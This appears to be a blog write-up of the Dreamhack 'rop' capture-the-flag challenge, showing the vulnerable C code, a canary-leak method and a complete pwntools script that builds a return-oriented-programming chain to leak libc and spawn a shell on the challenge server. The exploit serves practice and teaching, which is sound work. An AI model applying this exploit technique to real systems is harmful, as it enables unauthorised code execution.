+++
date = '2026-05-05'
draft = false
title = 'Dreamhack rop Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview

Exploit Tech: Return Oriented Programming에서 실습하는 문제입니다.

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5u);
  read(0, buf, 0x100u);
  printf("Buf: %s\n", buf);
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5u);
  read(0, buf, 0x100u);
  return 0;
}
```

## Identifying the vulnerabilities

This time, no PIE, but NX and canary enabled.

They are being nice though, and giving us a canary leak with printf before anything else. Well, let's find the canary then, shall we?

I'm thinking, if we overwrite the null byte terminator, it's going to go ahead and print what's immediately after that as well (the canary). Testing it quickly, sending "A" 56 times achieves exactly this!

Here it is, on the stack:

![challenge-screenshot](canary.png#center)

To actually print it, we need to overwrite the null byte it ends in, then read the remaining 7 bytes and pad them. 

Now, just remember that we need to include the canary in our payload, right before `rbp`. It's time to connect remotely with out exploit, and figure out the required libc offsets! Just like in the last challenges, we're working with `libc6_2.35-0ubuntu1_amd64`.

And, the flag!

![challenge-screenshot](flag.png#center)


## The exploit

```python
from pwn import *
import time
elf = ELF('/home/kali/Downloads/dreamhack/rop/rop')
p=elf.process()

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:23755'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
pop_rdi_ret = 0x400853
ret = 0x400596
puts_plt = elf.plt[b'puts']
puts_got = elf.got[b'puts']
main = 0x4006f7

#gdb.attach(p)

payload = b"A"*55+b"C"+b"D"
p.recvuntil(b": ")
p.send(payload)

p.recvuntil(b"D")
#canary is 8 bytes so we only need this part

data1 = p.recv(7)
canary = u64(data1.rjust(8, b"\x00"))
print(f"canary ist {hex(canary)}!")

p.recvuntil(b": ")
payload = b"A"*56 + p64(canary) + b"B"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
p.send(payload)
sleep(1)

data3 = p.recv(6)
leak = u64(data3.ljust(8, b"\x00"))
print(f"puts ist {hex(leak)}!")
puts_offset = 0x084ed0
system_offset = 0x054d60
binsh_offset = 0x1dc698

libc = leak - puts_offset
system = libc + system_offset
binsh = libc + binsh_offset

sleep(1)
p.send(b"a")

sleep(1)
payload = b"A"*56 + p64(canary) + b"B"*8 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
p.send(payload)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/rop.py)**.
